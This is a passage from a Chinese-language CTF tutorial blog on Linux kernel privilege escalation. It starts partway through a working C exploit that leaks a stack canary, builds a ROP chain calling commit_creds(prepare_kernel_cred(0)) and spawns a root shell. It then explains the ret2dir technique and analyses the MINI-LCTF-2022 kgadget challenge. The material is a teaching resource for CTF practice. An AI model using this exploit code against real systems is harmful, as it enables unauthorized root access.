class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m Status has been saved . \033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *addr)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;try read\n&quot;</span>);<br>  ioctl(fd,<span class="hljs-number">0x6677889B</span>,addr);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read done!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> off)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;try set off \n&quot;</span>);<br>  ioctl(fd,<span class="hljs-number">0x6677889C</span>,off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> nbytes)</span>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;try cp\n&quot;</span>);<br>  ioctl(fd,<span class="hljs-number">0x6677889A</span>,nbytes);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_function_address</span><span class="hljs-params">()</span>&#123;<br>        FILE* sym_table = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);        <span class="hljs-comment">// including all address of kernel functions,just like the user model running address.</span><br>        <span class="hljs-keyword">if</span>(sym_table == <span class="hljs-literal">NULL</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-type">size_t</span> addr = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">char</span> type[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">char</span> func_name[<span class="hljs-number">0x50</span>];<br>        <span class="hljs-comment">// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, func_name))&#123;<br>                <span class="hljs-keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)                <span class="hljs-comment">// two addresses of key functions are all found, return directly.</span><br>                        <span class="hljs-keyword">return</span>;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(func_name, <span class="hljs-string">&quot;commit_creds&quot;</span>))&#123;                <span class="hljs-comment">// function &quot;commit_creds&quot; found</span><br>                        commit_creds = addr;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;</span>, commit_creds);<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(func_name, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))&#123;<br>                        prepare_kernel_cred = addr;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;</span>, prepare_kernel_cred);<br>                &#125;<br>        &#125;<br>&#125;<br><br><br>​	<br>​	<span class="hljs-type">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span>&#123;<br>​	        <span class="hljs-keyword">if</span>(getuid())&#123;<br>​	                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m&quot;</span>);<br>​	                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>​	        &#125;<br>​	        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Getting the root......\033[0m\n&quot;</span>);<br>​	        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>​	        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>​	&#125;<br>​	<br>​	<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>​	  saveStatus();<br>​	  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>,<span class="hljs-number">2</span>);              <span class="hljs-comment">//get the process fd</span><br>​	  <span class="hljs-keyword">if</span>(!fd)&#123;<br>​	                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: Cannot open process \&quot;core\&quot;\n\033[0m&quot;</span>);<br>​	                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>​	        &#125;<br>​	  <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>​	        get_function_address();                <span class="hljs-comment">// get addresses of two key function</span><br>​	  <span class="hljs-type">ssize_t</span> vmlinux = commit_creds - commit_creds;            <span class="hljs-comment">//base address</span><br>​	  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;vmlinux_base = %x&quot;</span>,vmlinux);<br>​	  <span class="hljs-comment">//get canary </span><br>​	  <span class="hljs-type">size_t</span> canary;<br>​	  change_off(fd,<span class="hljs-number">0x40</span>);<br>​	  <span class="hljs-comment">//getchar();</span><br>​	  <br>​	  core_read(fd,buffer);<br>​	  canary = ((<span class="hljs-type">size_t</span> *)buffer)[<span class="hljs-number">0</span>];<br>​	  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;canary ==&gt; %p\n&quot;</span>,canary);<br>​	  <span class="hljs-comment">//build the ROP</span><br>​	  <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x1000</span>] ,i= <span class="hljs-number">0</span>;<br>​	  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;construct the chain\n&quot;</span>);<br>​	  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt; <span class="hljs-number">10</span> ;i++)&#123;<br>​	    rop_chain[i] = canary;<br>​	  &#125;<br>​	  rop_chain[i++] = POP_RDI_RET + vmlinux ; <br>​	  rop_chain[i++] = <span class="hljs-number">0</span>;<br>​	  rop_chain[i++] = prepare_kernel_cred ;          <span class="hljs-comment">//prepare_kernel_cred(0)</span><br>​	  rop_chain[i++] = POP_RDX_RET + vmlinux;<br>​	  rop_chain[i++] = POP_RCX_RET + vmlinux;<br>​	  rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + vmlinux;<br>​	  rop_chain[i++] = commit_creds ;<br>​	  rop_chain[i++] = SWAPGS_POPFQ_RET + vmlinux;<br>​	  rop_chain[i++] = <span class="hljs-number">0</span>;<br>​	  rop_chain[i++] = IRETQ + vmlinux;<br>​	  rop_chain[i++] = (<span class="hljs-type">size_t</span>)shell;<br>​	  rop_chain[i++] = user_cs;<br>​	  rop_chain[i++] = user_rflags;<br>​	  rop_chain[i++] = user_sp;<br>​	  rop_chain[i++] = user_ss;<br>​	  write(fd,rop_chain,<span class="hljs-number">0x800</span>);<br>​	  core_copy_func(fd,<span class="hljs-number">0xffffffffffff0100</span>); <br>​	&#125;<br><br><br><br></code></pre></td></tr></table></figure>

<h3 id="7-编译运行"><a href="#7-编译运行" class="headerlink" title="7. 编译运行"></a>7. 编译运行</h3><p>这里哟个小知识,那就是在被攻击的内核中一般不会给你库函数,所以咱们需要用gcc中的-static参数进行静态链接,然后就是为了支持内嵌汇编代码,所以我们需要使用<code>-masm=intel</code>,这里intel也可以换amd,看各位汇编语言用的啥来进行修改.我这里用的把保存状态代码是intel支持的.</p>
<pre><code class="hljs">gcc test.c -o test -static -masm=intel -g
</code></pre>
<p>将此编译得到的二进制文件打包近文件系统然后重新启动,情况如图</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/faf2b2119313b07e6cb81eca49d7912396dd8cef.jpg" srcset="/img/loading.gif" lazyload></p>
<h5 id="成功提权"><a href="#成功提权" class="headerlink" title="成功提权!!!!!"></a><strong>成功提权!!!!!</strong></h5><h1 id="二、Kernel-ret2dir"><a href="#二、Kernel-ret2dir" class="headerlink" title="二、Kernel ret2dir"></a>二、Kernel ret2dir</h1><h2 id="0-ret2dir原理"><a href="#0-ret2dir原理" class="headerlink" title="0.ret2dir原理"></a>0.ret2dir原理</h2><p>ret2dir的存在是为了解决SMAP&#x2F;SMEP保护模式的一种手法，该保护模式是阻止了内核程序执行用户程序，第一次被提出是在14年的一篇论文，这里页给出链接</p>
<p><a target="_blank" rel="noopener" href="https://cs.brown.edu/~vpk/papers/ret2dir.sec14.pdf">ret2dir原论文</a><br>首先我们得知道一下Linux内存中的基本布局，链接如下，有兴趣的同学可以自行观看</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.0/source/Documentation/x86/x86_64/mm.txt">Linux 内存布局</a></p>
<p>我们可以看到有以下一个区域</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">========================================================================================================================<br>    Start addr    |<span class="hljs-string">   Offset   </span>|<span class="hljs-string">     End addr     </span>|<span class="hljs-string">  Size   </span>|<span class="hljs-string"> VM area description</span><br><span class="hljs-string">========================================================================================================================</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000000000000000 |<span class="hljs-string">    0       </span>|<span class="hljs-string"> 00007fffffffffff </span>|<span class="hljs-string">  128 TB </span>|<span class="hljs-string"> user-space virtual memory, different per mm</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000800000000000 |<span class="hljs-string"> +128    TB </span>|<span class="hljs-string"> ffff7fffffffffff </span>|<span class="hljs-string"> ~16M TB </span>|<span class="hljs-string"> ... huge, almost 64 bits wide hole of non-canonical</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     virtual memory addresses up to the -128 TB</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     starting offset of kernel mappings.</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Kernel-space virtual memory, shared between all processes:</span><br><span class="hljs-string">____________________________________________________________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffff800000000000 |<span class="hljs-string"> -128    TB </span>|<span class="hljs-string"> ffff87ffffffffff </span>|<span class="hljs-string">    8 TB </span>|<span class="hljs-string"> ... guard hole, also reserved for hypervisor</span><br><span class="hljs-string"> ffff880000000000 </span>|<span class="hljs-string"> -120    TB </span>|<span class="hljs-string"> ffff887fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> LDT remap for PTI</span><br><span class="hljs-string"> ffff888000000000 </span>|<span class="hljs-string"> -119.5  TB </span>|<span class="hljs-string"> ffffc87fffffffff </span>|<span class="hljs-string">   64 TB </span>|<span class="hljs-string"> direct mapping of all physical memory (page_offset_base)</span><br><span class="hljs-string"> ffffc88000000000 </span>|<span class="hljs-string">  -55.5  TB </span>|<span class="hljs-string"> ffffc8ffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffc90000000000 </span>|<span class="hljs-string">  -55    TB </span>|<span class="hljs-string"> ffffe8ffffffffff </span>|<span class="hljs-string">   32 TB </span>|<span class="hljs-string"> vmalloc/ioremap space (vmalloc_base)</span><br><span class="hljs-string"> ffffe90000000000 </span>|<span class="hljs-string">  -23    TB </span>|<span class="hljs-string"> ffffe9ffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffea0000000000 </span>|<span class="hljs-string">  -22    TB </span>|<span class="hljs-string"> ffffeaffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> virtual memory map (vmemmap_base)</span><br><span class="hljs-string"> ffffeb0000000000 </span>|<span class="hljs-string">  -21    TB </span>|<span class="hljs-string"> ffffebffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffec0000000000 </span>|<span class="hljs-string">  -20    TB </span>|<span class="hljs-string"> fffffbffffffffff </span>|<span class="hljs-string">   16 TB </span>|<span class="hljs-string"> KASAN shadow memory</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|____________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Identical layout to the 56-bit one from here on:</span><br><span class="hljs-string">____________________________________________________________</span>|____________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> fffffc0000000000 |<span class="hljs-string">   -4    TB </span>|<span class="hljs-string"> fffffdffffffffff </span>|<span class="hljs-string">    2 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string"> vaddr_end for KASLR</span><br><span class="hljs-string"> fffffe0000000000 </span>|<span class="hljs-string">   -2    TB </span>|<span class="hljs-string"> fffffe7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> cpu_entry_area mapping</span><br><span class="hljs-string"> fffffe8000000000 </span>|<span class="hljs-string">   -1.5  TB </span>|<span class="hljs-string"> fffffeffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffff0000000000 </span>|<span class="hljs-string">   -1    TB </span>|<span class="hljs-string"> ffffff7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> %esp fixup stacks</span><br><span class="hljs-string"> ffffff8000000000 </span>|<span class="hljs-string"> -512    GB </span>|<span class="hljs-string"> ffffffeeffffffff </span>|<span class="hljs-string">  444 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffef00000000 </span>|<span class="hljs-string">  -68    GB </span>|<span class="hljs-string"> fffffffeffffffff </span>|<span class="hljs-string">   64 GB </span>|<span class="hljs-string"> EFI region mapping space</span><br><span class="hljs-string"> ffffffff00000000 </span>|<span class="hljs-string">   -4    GB </span>|<span class="hljs-string"> ffffffff7fffffff </span>|<span class="hljs-string">    2 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">   -2    GB </span>|<span class="hljs-string"> ffffffff9fffffff </span>|<span class="hljs-string">  512 MB </span>|<span class="hljs-string"> kernel text mapping, mapped to physical address 0</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">-2048    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffffffffa0000000 |<span class="hljs-string">-1536    MB </span>|<span class="hljs-string"> fffffffffeffffff </span>|<span class="hljs-string"> 1520 MB </span>|<span class="hljs-string"> module mapping space</span><br><span class="hljs-string"> ffffffffff000000 </span>|<span class="hljs-string">  -16    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br>    FIXADDR_START |<span class="hljs-string"> ~-11    MB </span>|<span class="hljs-string"> ffffffffff5fffff </span>|<span class="hljs-string"> ~0.5 MB </span>|<span class="hljs-string"> kernel-internal fixmap range, variable size and offset</span><br><span class="hljs-string"> ffffffffff600000 </span>|<span class="hljs-string">  -10    MB </span>|<span class="hljs-string"> ffffffffff600fff </span>|<span class="hljs-string">    4 kB </span>|<span class="hljs-string"> legacy vsyscall ABI</span><br><span class="hljs-string"> ffffffffffe00000 </span>|<span class="hljs-string">   -2    MB </span>|<span class="hljs-string"> ffffffffffffffff </span>|<span class="hljs-string">    2 MB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br><br><br>====================================================<br>Complete virtual memory map with 5-level page tables<br>====================================================<br></code></pre></td></tr></table></figure>



<p>我们可以看到这一行</p>
<pre><code class="hljs"> ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
</code></pre>
<p>这里我们通过后面的内存段解释可以知道，他是映射了整个物理地址<br>而这里还有个点就是，再Linux内核当中，分配内存通常有以下两种方式：</p>
<ol>
<li>vmalloc, 这里按照页为单位分配，需要虚拟地址连续，物理地址不需要连续</li>
<li>kmalloc, 这里按照字节为单位分配，虚拟地址和物理地址都需要连续</li>
</ol>
<p>而我们通常采用kmalloc进行分配。<br>因此，此时的内存就存在以下的情况</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/d788d43f8794a4c226dfe3e34bf41bd5ac6e397d.jpg" srcset="/img/loading.gif" lazyload></p>
<p>在早期，我们的physmap是可执行的，所以我们可以在用户态编写好shellcode，然后在内核态劫持程序流到此就可以实现我们想得到的操作，但是目前的话我们的physmap一般都设置为不可执行，因此我们就无法通过shellcode的方式，但是我们仍然可以通过ROP来得到我们想要的结果<br>所以我们目前的利用手法就是如下：</p>
<ol>
<li>在用户态使用mmap来大量映射进行堆喷，这里咱们申请的越多，我们在物理内存当中使用的地址就会越大，而后我们在内核态也能更快的得到我们所期待的重合段</li>
<li>然后我们在内核态利用漏洞获得堆上的地址，也就是<code>kmalloc</code>后获取到的<code>slab</code>的地址，然后计算出physmap的地址</li>
<li>利用ROP劫持执行流到physmap上面</li>
</ol>
<p>通过上面的手法，我们就可以避开传统的内核访问用户但是被隔绝的情况，此时我们相当于是直接操作物理内存</p>
<h2 id="1-例题MINI-LCTF-2022-Kgadget"><a href="#1-例题MINI-LCTF-2022-Kgadget" class="headerlink" title="1.例题MINI-LCTF-2022 Kgadget"></a>1.例题MINI-LCTF-2022 Kgadget</h2><p>[md]这里我就奉行拿来主义，给出arttnba3师傅出的题，如有冒犯立马删（胆小</p>
<p><a target="_blank" rel="noopener" href="https://arttnba3.cn/download/minil2022/pwn/kgadget.tar.xz">ret2dir例题</a></p>
<p>拿到题第一步，首先咱们解压了看看</p>
<pre><code class="hljs"> tar -Jxf kgadget.tar.xzf
</code></pre>
<p>这个XZ文件有两种解压方式，还有一种就是先解压成tar，再解压tar<br>然后我们获取到文件系统后先来看看init脚本</p>
<pre><code class="hljs">  1 #!/bin/sh
  2 chown -R 0:0 /
  3 mount -t tmpfs tmpfs /tmp
  4 mount -t proc none /proc
  5 mount -t sysfs none /sys
  6 mount -t devtmpfs devtmpfs /dev
  7 
  8 echo 1 &gt; /proc/sys/kernel/dmesg_restrict
  9 echo 1 &gt; /proc/sys/kernel/kptr_restrict
 10 
 11 chown 0:0 /flag
 12 chmod 400 /flag
 13 chmod 777 /tmp
 14 
 15 insmod kgadget.ko
 16 chmod 777 /dev/kgadget
 17 
 18 cat /root/banner
 19 echo -e &quot;\nBoot took $(cut -d&#39; &#39; -f1 /proc/uptime) seconds\n&quot;
 20 setsid cttyhack setuidgid 1000 sh                                                                                                                                                                                                
 21 poweroff -d 0 -f
</code></pre>
<h2 id="2-IDA逆向"><a href="#2-IDA逆向" class="headerlink" title="2.IDA逆向"></a>2.IDA逆向</h2><p>可以看到其中insmod了一个<code>kgadget.ko</code>，这儿也是咱们的漏洞模块,首先我们使用checksec来查看一下该模块<br><img src="http://imgsrc.baidu.com/forum/pic/item/29381f30e924b8990b9379f02b061d950b7bf64f.jpg" srcset="/img/loading.gif" lazyload><br>然后我们拖入IDA进行静态分析，首先就是ioctl函数<br><img src="http://imgsrc.baidu.com/forum/pic/item/a686c9177f3e67098b9646377ec79f3df9dc5567.jpg" srcset="/img/loading.gif" lazyload><br>可以看到这里咱们其实编译会出点问题，所以我们到汇编这里查看</p>
<pre><code class="hljs">.text.unlikely:000000000000011C 48 8B 1A                      mov     rbx, [param]                    ; 我们传递的函数param
.text.unlikely:000000000000011F                               kgadget_ptr = rbx                       ; void (*)(void)
.text.unlikely:000000000000011F 48 C7 C7 70 03 00 00          mov     __file, offset unk_370
.text.unlikely:0000000000000126 48 89 DE                      mov     cmd, kgadget_ptr
.text.unlikely:0000000000000129 E8 2A 0F 00 00                call    printk                          ; PIC mode
.text.unlikely:0000000000000129
.text.unlikely:000000000000012E 48 C7 C7 A0 03 00 00          mov     rdi, offset unk_3A0
.text.unlikely:0000000000000135 E8 1E 0F 00 00                call    printk                          ; PIC mode
.text.unlikely:0000000000000135
.text.unlikely:000000000000013A 48 89 65 E8                   mov     [rbp-18h], rsp
.text.unlikely:000000000000013E 48 8B 45 E8                   mov     rax, [rbp-18h]
.text.unlikely:0000000000000142 48 C7 C7 F8 03 00 00          mov     rdi, offset byte_3F8
.text.unlikely:0000000000000149 48 05 00 10 00 00             add     rax, 1000h
.text.unlikely:000000000000014F 48 25 00 F0 FF FF             and     rax, 0FFFFFFFFFFFFF000h         ; rax此时为内核栈的栈底，也就是最高处
.text.unlikely:0000000000000155 48 8D 90 58 FF FF FF          lea     rdx, [rax-0A8h]                 ; 此时将距离栈底0xA8的位置传入rdx,该rdx所在的地址将会作为一个中断栈，保存中断的寄存器值
.text.unlikely:000000000000015C 48 89 55 E8                   mov     [rbp-18h], rdx
.text.unlikely:0000000000000160                               regs = rdx                              ; pt_regs *
.text.unlikely:0000000000000160 48 BA 61 72 74 74 6E 62 61 33 mov     regs, 3361626E74747261h         ; 无效值
.text.unlikely:000000000000016A 48 89 90 58 FF FF FF          mov     [rax-0A8h], rdx                 ; r15
.text.unlikely:0000000000000171 48 89 90 60 FF FF FF          mov     [rax-0A0h], rdx                 ; r14
.text.unlikely:0000000000000178 48 89 90 68 FF FF FF          mov     [rax-98h], rdx                  ; r13
.text.unlikely:000000000000017F 48 89 90 70 FF FF FF          mov     [rax-90h], rdx                  ; r12
.text.unlikely:0000000000000186 48 89 90 78 FF FF FF          mov     [rax-88h], rdx                  ; rbp
.text.unlikely:000000000000018D 48 89 50 80                   mov     [rax-80h], rdx                  ; rbx
.text.unlikely:0000000000000191 48 89 50 90                   mov     [rax-70h], rdx                  ; r10
.text.unlikely:0000000000000195 E8 BE 0E 00 00                call    printk                          ; PIC mode
.text.unlikely:0000000000000195
.text.unlikely:000000000000019A E8 B1 0E 00 00                call    __x86_indirect_thunk_rbx        ; PIC mode
</code></pre>
<p>可以看到一个<code>pt_regs</code> 结构体，我们在这里查看一下这个结构体的含义</p>
<pre><code class="hljs">struct pt_regs &#123;
/*
 * C ABI says these regs are callee-preserved. They aren&#39;t saved on kernel entry
 * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.
 */
        unsigned long r15;
        unsigned long r14;
        unsigned long r13;
        unsigned long r12;
        unsigned long rbp;
        unsigned long rbx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
        unsigned long r11;
        unsigned long r10;
        unsigned long r9;
        unsigned long r8;
        unsigned long rax;
        unsigned long rcx;
        unsigned long rdx;
        unsigned long rsi;
        unsigned long rdi;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it&#39;s IRQ number:
 */
        unsigned long orig_rax;
/* Return frame for iretq */
        unsigned long rip;
        unsigned long cs;
        unsigned long eflags;
        unsigned long rsp;
        unsigned long ss;
/* top of stack page */
&#125;;
</code></pre>
<p>由于这里我曾经写过操作系统，所以这里的结构体一眼可以看出是中断发生时所保存的寄存器结构，他是被压在内核栈当中的，然后我们的ioctl函数实际上是将r15~r12、rbp、rbx以及r10置为了无效值，仅仅保留了几个关键寄存器值。<br>然后最后一条语句</p>
<pre><code class="hljs">.text.unlikely:0000000000000195
.text.unlikely:000000000000019A E8 B1 0E 00 00                call    __x86_indirect_thunk_rbx        ; PIC mode
</code></pre>
<p>这里是编译器的优化，实际上等同于<code>call rbx</code>, 而rbx种我们保存的是我们刚刚传递的函数<br>我们分析完ioctl，我们来看看qemu的启动脚本</p>
<pre><code class="hljs">  1 #!/bin/sh
  2 qemu-system-x86_64 \
  3   -m 256M \
  4   -cpu kvm64,+smep,+smap \
  5   -smp cores=2,threads=2 \
  6   -kernel bzImage \
  7   -initrd ./rootfs.cpio \
  8   -nographic \
  9   -monitor /dev/null \
 10   -snapshot \
 11   -append &quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot; \                                                                                                                                                              
 12   -no-reboot
</code></pre>
<h2 id="3-前期准备"><a href="#3-前期准备" class="headerlink" title="3.前期准备"></a>3.前期准备</h2><p>我们可以看到这里是开启了smep和smap，阻隔了内核访问用户数据或代码，还有就是nokalsr，说明我们可以通过vmlinux来获取关键函数的地址<br>首先我们目前是只拥有<code>bzImage</code>，因此我们通过下面脚本来获取其中的<code>vmlinux</code>，然后来获取关键函数地址</p>
<ul>
<li>这里获取vmlinux有两种方法，其中之一就是下面的<code>extract-vmlinux</code>脚本，不过有的地方会有不同程度的失败，要么是无法真正解压，要么是解压出来没有符号表</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/sh</span><br>	<span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0-only</span><br>	<span class="hljs-comment"># ----------------------------------------------------------------------</span><br>	<span class="hljs-comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment"># Inspired from extract-ikconfig</span><br>	<span class="hljs-comment"># (c) 2009,2010 Dick Streefland &lt;[url=mailto:dick@streefland.net]dick@streefland.net[/url]&gt;</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment"># (c) 2011      Corentin Chary &lt;[url=mailto:corentin.chary@gmail.com]corentin.chary@gmail.com[/url]&gt;</span><br>	<span class="hljs-comment">#</span><br>	<span class="hljs-comment"># ----------------------------------------------------------------------</span><br>	<br>	check_vmlinux()<br>	&#123;<br>	    <span class="hljs-comment"># Use readelf to check if it&#x27;s a valid ELF</span><br>	    <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span><br>	    <span class="hljs-comment">#       and not just an elf</span><br>	    readelf -h $<span class="hljs-number">1</span> &gt; /dev/null <span 